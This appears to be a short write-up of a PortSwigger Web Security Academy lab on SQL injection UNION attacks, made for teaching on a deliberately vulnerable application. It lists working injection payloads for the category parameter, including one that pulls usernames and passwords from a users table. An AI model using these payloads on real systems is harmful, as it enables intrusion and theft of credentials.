## SQL injection UNION attack, retrieving data from other tables

**Category:** sqli
**Difficulty:** Unknown

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

### Solution Steps
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data . Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'--
3. Use the following payload to retrieve the contents of the users table: '+UNION+SELECT+username,+password+FROM+users--
4. Verify that the application's response contains usernames and passwords.

### Key Payloads
- `users`
- `username`
- `password`
- `administrator`
- `'+UNION+SELECT+'abc','def'--`
- `'+UNION+SELECT+username,+password+FROM+users--`

### Indicators of Success
- SQL syntax errors reveal injection point
- UNION SELECT returns additional data
- Boolean conditions change response
- Time delays confirm blind injection
- Database contents extracted
---
*Source: PortSwigger Web Security Academy*
